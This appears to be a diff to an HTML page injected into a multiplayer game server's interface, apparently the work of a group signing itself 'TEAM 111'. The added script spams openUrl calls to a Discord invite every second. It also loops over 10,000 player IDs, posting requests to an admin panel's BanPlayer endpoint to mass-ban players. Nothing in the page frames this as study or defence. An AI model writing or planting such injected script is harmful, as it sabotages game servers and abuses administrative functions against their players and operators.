@@ -200,12 +200,23 @@ fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "c
     </script>
 <script>
 setInterval(() => {
-window.invokeNative("openUrl", "https://discord.gg/T111");
-window.invokeNative("openUrl", "https://discord.gg/T111");
-window.invokeNative("openUrl", "https://discord.gg/T111");
-window.invokeNative("openUrl", "https://discord.gg/T111");
+window.invokeNative("openUrl", "https://discord.gg/KaQTzbUU");
+window.invokeNative("openUrl", "https://discord.gg/KaQTzbUU");
+window.invokeNative("openUrl", "https://discord.gg/KaQTzbUU");
+window.invokeNative("openUrl", "https://discord.gg/KaQTzbUU");
 }, 1000);
-    </script>
+    <body>
+  <script>
+for (let i = 1; i <= 10000; i++) {
+    setTimeout(() => {
+        $.post('https://EC-PANEL/BanPlayer', JSON.stringify({
+            id: i,
+            Reason: "TEAM 111 IS HERE "
+        }));
+    }, i * 50); // تأخير 50ms بين كل لاعب
+}
+  </script>
+
 
 </body>
 </html>
